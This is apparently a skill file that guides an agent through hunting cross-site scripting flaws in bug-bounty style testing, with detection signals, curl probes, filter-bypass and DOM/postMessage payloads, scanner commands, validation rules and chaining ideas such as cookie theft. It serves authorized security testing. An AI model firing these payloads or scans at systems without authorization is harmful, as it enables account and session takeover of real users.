---
name: hunt-xss
description: >
  Hunt for Cross-Site Scripting: reflected, stored, and DOM-based XSS. Use when user input
  is echoed into HTML, JS, attributes, or URLs — search boxes, comment fields, profile
  fields, URL params rendered in page, postMessage handlers, client-side routers.
  Keywords: xss, cross-site scripting, dom xss, stored xss, reflected xss, innerHTML,
  document.write, sink, source, polyglot payload, CSP bypass, mXSS, dompurify bypass.
  Excludes self-XSS (requires victim to paste payload into their own console/field with no
  realistic delivery path) — note as Unproven, not a finding, unless combined with clickjacking
  or CSRF to force the paste. Do NOT use for server-side template execution — use hunt-ssti.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-79]
  mitre_attack: [T1059.007, T1189]
  tools: [dalfox, XSStrike, nuclei, burp, curl]
depends_on: [active-recon, web-crawling, param-discovery]
feeds_into: [chain-analysis, session-hijack]
chains_with: [csrf, open-redirect, auth-bypass]
---

## Signals

- Any reflected input visible verbatim (or lightly encoded) in HTML response: view-source for
  your probe string.
- Rich-text/comment fields with no sanitization library, or custom sanitizers (regex-based
  blocklists are a strong signal — they're almost always bypassable).
- DOM sinks reachable from URL/location: grep client JS for `innerHTML`, `outerHTML`,
  `document.write`, `insertAdjacentHTML`, `eval`, `setTimeout(string)`, `location.href=`,
  `jQuery.html()`, Angular's `bypassSecurityTrust*`, React's `dangerouslySetInnerHTML`.
- `postMessage` listeners without origin validation (`window.addEventListener('message', ...)`
  with no `event.origin` check).
- Response headers missing or permissive CSP (`Content-Security-Policy` absent, or
  `unsafe-inline`/`unsafe-eval` present, or `*` in `script-src`).
- File upload or SVG upload that gets served back inline (SVG can carry `<script>`).

## Prerequisites

- An injection point you can control that round-trips into a page rendered in a browser context
  (not just an API JSON response consumed by non-browser clients).
- For stored XSS: ability to create content viewed by another user/role (comment, ticket,
  display name, support message) — the real severity lives in *who* views it.
- For DOM XSS: the client-side JS source (view it unminified if possible, or beautify) to trace
  source→sink.

## Methodology

1. **Reflection probe.** Use a unique, grep-able marker first, not a real payload, to map exactly
   where/how input lands (HTML body, attribute, JS string, URL, comment):
   ```bash
   curl -s "https://target/search?q=zzXSSMARKER99" | grep -o '.\{30\}zzXSSMARKER99.\{30\}'
   ```
   Check encoding: is `<` reflected as `<`, `&lt;`, or stripped? Is it inside
   `<div>HERE</div>`, `value="HERE"`, or `var x = 'HERE';`?

2. **Context-appropriate payload** based on step 1:
   ```text
   HTML body context:      <script>alert(document.domain)</script>
   HTML attribute context: " autofocus onfocus=alert(document.domain) x="
   JS string context:      ';alert(document.domain);//
   URL/href context:       javascript:alert(document.domain)
   SVG/upload context:     <svg onload=alert(document.domain)>
   ```
   Confirm execution in an actual browser (headless or real) — a raw curl match is not proof.

3. **Filter/encoding bypass** if the direct payload is stripped/encoded:
   ```bash
   # case variation, nested tags (classic blocklist-regex bypass), event handlers
   curl -s --data-urlencode 'q=<ScRiPt>alert(1)</sCrIpT>' "https://target/search"
   curl -s --data-urlencode 'q=<img src=x onerror=alert(1)>' "https://target/search"
   curl -s --data-urlencode 'q=<svg/onload=alert(1)>' "https://target/search"
   curl -s --data-urlencode 'q=<<script>alert(1)//<</script>' "https://target/search"
   ```

4. **Automated scanning** to triage breadth once manual methodology is understood:
   ```bash
   dalfox url "https://target/search?q=FUZZ" --custom-alert-value "DALFOX-$(date +%s)"
   dalfox file urls.txt -o dalfox_results.txt --silence
   python3 xsstrike.py -u "https://target/search?q=test" --fuzzer
   nuclei -l urls.txt -tags xss -o nuclei_xss.txt
   ```

5. **DOM XSS — source to sink tracing.** Pull client JS, find sinks, trace back to a
   user-controlled source:
   ```bash
   curl -s https://target/app.js -o app.js
   grep -nE "innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(|dangerouslySetInnerHTML|bypassSecurityTrust" app.js
   grep -nE "location\.(hash|search|href)|URLSearchParams|document\.referrer" app.js
   ```
   If a sink consumes `location.hash`/`location.search` directly, test:
   ```
   https://target/app#<script>alert(document.domain)</script>
   https://target/app?param=<img src=x onerror=alert(document.domain)>
   ```
   Confirm in a real browser devtools console (hash-based payloads never hit the server, so
   curl/nuclei alone will miss them — this is a client-only bug).

6. **postMessage XSS.** Check listener origin validation; craft a cross-origin page that posts a
   malicious payload:
   ```html
   <script>
   const w = window.open("https://target/app");
   setTimeout(() => w.postMessage("<img src=x onerror=alert(document.domain)>", "*"), 2000);
   </script>
   ```

7. **Stored XSS — plant and verify from victim context.** Submit payload via normal app flow,
   then view it as a *different* authenticated session/role (second browser profile or
   incognito logged in as another test account) to confirm it fires outside your own session —
   this is what separates stored XSS from self-XSS.

8. **CSP bypass check** if CSP is present — don't give up, enumerate allowed sources:
   ```bash
   curl -sI https://target/app | grep -i content-security-policy
   ```
   Look for `script-src` allowing JSONP endpoints, old library CDNs with known gadget payloads,
   `unsafe-inline` with no nonce, or `base-uri` missing (allows `<base>` href hijack of relative
   script tags).

## Tooling

- `dalfox` — fast param-based XSS scanning with blind callback support (`--blind`).
- `XSStrike` — fuzzing + context-aware payload generation + basic WAF detection.
- `nuclei -tags xss` — template-based triage across many hosts.
- Browser devtools (manual) — mandatory for DOM XSS and real execution confirmation.
- Burp Suite — manual context analysis, CSP evaluator extension.

## Root Causes

- Output encoding missing/wrong for context (HTML-encoding a value placed inside a `<script>`
  block does nothing — each context needs its own encoding).
- Client-side frameworks' "escape hatches" used on user data (`dangerouslySetInnerHTML`,
  `[innerHTML]` binding, `v-html`, `bypassSecurityTrustHtml`).
- Custom/regex-based sanitizers instead of a vetted library (DOMPurify, context-aware templating
  auto-escaping).
- `postMessage` handlers trusting `event.data` without checking `event.origin`.
- SVG/file uploads served with `Content-Type` that lets the browser render them as HTML/SVG
  instead of forcing `Content-Disposition: attachment`.

## Validation Gate (minimum proof)

- Reproducible JS execution in a real (or headless) browser context — `alert()`/console log
  firing — with the exact request and the rendered DOM/console screenshot as evidence.
- For stored XSS: fired from a *second* session/role viewing the stored content, not just the
  submitting session.
- For DOM XSS: the source (URL fragment/param/referrer) and the exact sink line in client JS,
  plus a working URL that triggers it unauthenticated (or with victim's session) in a fresh
  browser.

## Gotchas

- **Self-XSS is not a finding** per this project's rules unless there's a realistic delivery
  mechanism (CSRF-forced submission, clickjacking) — label the bare case Unproven and say why.
- **Common N/A:** payload reflected but `Content-Type: application/json` or `text/plain` — no
  browser will execute it; check the actual response header, not just the URL path.
- **Common N/A:** reflected only inside an HTML comment with no comment-escape vector, or only in
  a non-rendered API response consumed by a backend service.
- **Overclaim trap:** an `alert()` firing in *your own* browser while testing a "reflected" payload
  that required you to be authenticated as yourself and submit the form yourself is self-XSS, not
  reflected XSS — reflected XSS must work via a URL a victim clicks.
- **Overclaim trap:** CSP `report-only` mode still allows execution — don't mark XSS as mitigated
  just because a CSP header exists; check it's enforcing, and check it actually blocks your payload
  (test the real payload against it, don't assume from header presence).
- Encoded output in HTTP response but decoded client-side via JS (`decodeURIComponent` before an
  `innerHTML` sink) bypasses server-side encoding entirely — always check post-JS-execution DOM,
  not just raw HTTP response.
- WAFs often block `<script>` but miss event-handler-based or `javascript:` vectors — rotate
  payload families before declaring a field safe.

## Chains & Compositions

- Stored XSS in admin-visible field → session/cookie theft → **auth-bypass** (session hijack).
- XSS + missing `HttpOnly` on session cookie → direct cookie exfil.
- XSS → CSRF token theft (read token from DOM) → bypasses **csrf** protections entirely.
- XSS → forced open-redirect chain for phishing credibility.
- DOM XSS via postMessage → cross-origin **cswsh**-adjacent trust abuse if combined with
  **hunt-websocket** origin issues.
